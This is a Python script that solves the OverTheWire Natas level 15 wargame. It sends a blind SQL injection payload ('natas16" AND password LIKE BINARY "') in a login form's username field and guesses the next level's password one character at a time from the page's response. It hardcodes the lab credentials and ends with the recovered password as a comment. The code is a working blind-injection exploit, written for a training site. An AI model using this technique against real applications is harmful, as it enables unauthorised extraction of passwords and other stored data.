from requests import request

ch = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
sol = "natas16\" AND password LIKE BINARY \""
url = "http://natas15.natas.labs.overthewire.org"
url1 = "http://natas16.natas.labs.overthewire.org"
auth = ("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
ans = ""

while True:   
    for i in range(len(ch)):
        ans = ans + ch[i]
        sols = sol + ans + "%"
        data = {"username":sols,"submit":"Submit"}
        response = request("POST",url,auth=auth,data=data)
        con = response.content.decode("utf-8")
        key = con.split(" ")[37]
        if key == "doesn't":
            ans = ans[:-1]            
        else:
            print(ans)
            break
    auth1 = ("natas16",ans)
    response1 = request("POST",url1,auth=auth1)
    if response1.status_code == 200:
        break
    
print("The password for natas16 is " + ans)
print("Done")

# Result:
#   natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
